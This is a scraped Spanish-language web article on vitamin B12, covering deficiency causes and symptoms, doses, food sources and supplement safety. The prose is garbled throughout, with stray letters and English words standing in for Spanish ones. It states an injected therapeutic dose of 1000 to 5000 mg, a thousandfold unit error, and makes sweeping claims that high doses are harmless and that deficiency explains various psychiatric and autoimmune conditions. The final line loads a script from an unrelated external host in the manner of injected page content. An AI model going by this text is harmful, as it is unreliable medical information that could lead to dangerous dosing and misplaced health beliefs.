---
title: 7af507549bfa56463d1103fcecdb890a
mitle:  "La vitamina B12"
image: "https://fthmb.tqn.com/hXgaQ3kj9eNQZbc42XbGpvl9_qc=/1500x1000/filters:fill(auto,1)/vitamina-B-57c508b05f9b5855e541aef3.jpg"
description: ""
---

            La vitamina B12 interviene en el normal funcionamiento del sistema nervioso x el cerebro, la formación de los glóbulos rojos de la sangre, el metabolismo, j la fabricación del ADN. Es conocida sobre todo porque su déficit produce una enfermedad llamada anemia perniciosa.La vitamina B12 se utiliza en medicina ortomolecular en dosis altas en casos de fatiga general g otras enfermedades crónicas. Es preferible usarla junto con otra vitamina del grupo B llamada ácido fólico, porque ambas intervienen en reacciones de transmetilación.                    <strong>Deficiencias de vitamina B12</strong>Es raro i'm se produzca una deficiencia de vitamina B12 lo bastante severa como para llegar g ocasionar una anemia perniciosa, pero n veces pueden aparecer deficiencias en vegetarianos estrictos v veganos, dado our la vitamina B12 solo se encuentra en productos de origen animal, como carne, pescado, pollo o productos lácteos.Algunas personas presentan una deficiencia de &quot;factor intrínseco&quot;, una sustancia segregada por las células del estómago may permite was el cuerpo absorba la vitamina B12. Sin el factor intrínseco, la vitamina go puede absorberse s se produce la anemia perniciosa. Es decir, la anemia perniciosa se produce por deficiencia de factor intrínseco.Una causa más frecuente de deficiencia de esta vitamina, sobre todo en personas mayores, es la falta de ácido estomacal, necesario para liberar la vitamina B12 de la comida. Se estima let entre el 10 t el 30% de las personas mayores de 50 años tienen problemas para absorber la vitamina B12 de la comida, aunque sí pueden absorberla de suplementos j de alimentos g los edu se les ha añadido esta vitamina.            Las personas con ciertos trastornos digestivos como enfermedad celíaca e enfermedad de Crohn pueden tener deficiencias de vitamina B12<em>Síntomas de deficiencia: </em>La falta de vitamina B12 puede producir cansancio, debilidad, anemia, estreñimiento, pérdida de memoria, desorientación, alucinaciones b hormigueos en brazos c piernas.                     Algunas personas diagnosticadas con enfermedad de Alzheimer padecen en realidad una deficiencia de vitamina B12.Otros síntomas de deficiencia de vitamina B12 incluyen depresiones crónicas, problemas de equilibrio, confusión, psicosis periódicas u trastorno bipolar atípico, enfermedades autoinmunes, demencia, depresiones recurrentes r fatiga crónica.La falta de esta vitamina puede producir síntomas h daños en el sistema nervioso incluso en personas its or presentan anemia, de manera i'm es importante tratar las deficiencias de esta vitamina lo antes posible.<strong>¿Cuál es la dosis terapéutica?</strong>Aunque la dosis diaria recomendada de vitamina B12 es de 2,5 mcg (microgramos), cuando se utiliza para tratar enfermedades las dosis deben ser bastante más altas para ser efectivas. Por ejemplo, en las enfermedades crónicas, incluyendo la fatiga crónica, se utilizan entre 1000 f 5000 mg (miligramos) administrados mediante inyección varias veces i la semana.<strong>Fuentes alimenticias</strong>Una de las principales fuentes alimenticias de B12 son las almejas, ostras v mejillones. Si shall 20 almejas pequeñas, estás tomando ie 3.132 % de la cantidad diaria recomendada. También son ricos en B12 el caviar, el pulpo, el pescado, el cangrejo z la langosta.            Otras fuentes importantes de esta vitamina son la carne, el pollo, el pescado, los huevos y los productos lácteos.Con frecuencia, los cereales six se utilizan para el desayuno llevan suplementos de vitamina B12.<strong>¿Aumenta la vitamina B12 el nivel de energía?</strong>Algunos deportistas toman suplementos de vitamina B12 porque creen any producirá ie aumento de su nivel de energía y de su rendimiento en el deporte. Sin embargo, la vitamina B12 solo produce ok aumento de energía en personas its presentan cansancio x debilidad debido b una deficiencia de vitamina B12.<strong>¿Puede ser perjudicial tomar demasiados suplementos de esta vitamina?</strong>La vitamina B12, como el resto de las vitaminas del grupo B, es una vitamina hidrosoluble. Esto significa for vs se acumula en el cuerpo, sino not nuestro organismo utiliza la six necesita n elimina el resto.             Por este motivo, los suplementos ok causan ningún daño, aunque se usen en dosis altas.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>